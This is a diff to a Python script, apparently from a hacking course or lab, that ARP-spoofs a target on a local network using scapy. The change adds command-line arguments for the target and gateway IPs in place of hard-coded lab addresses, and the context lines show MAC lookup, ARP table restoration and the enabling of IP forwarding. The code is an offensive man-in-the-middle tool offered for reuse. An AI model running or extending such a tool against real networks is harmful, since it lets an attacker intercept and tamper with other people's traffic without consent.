@@ -3,6 +3,20 @@
 import scapy.all as scapy
 import subprocess
 import time
+import argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target to ARP Spoof")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway of target")
+    options = parser.parse_args()
+    if not options.target:
+        # handle error
+        parser.error("[-] Please specify a target to spoof, use --help for more info")
+    if not options.gateway:
+        # handle error
+        parser.error("[-] Please specify a gateway, use --help for more info")
+    return options
 
 def get_mac(ip_address):
     arp_request = scapy.ARP(pdst=ip_address)
@@ -24,8 +38,10 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 # get these from commandline args
-target_ip = "10.0.2.8"
-gateway_ip = "10.0.2.1"
+
+options = get_arguments()
+target_ip = options.target
+gateway_ip = options.gateway
 
 try:
     # start ip forwarding for packets
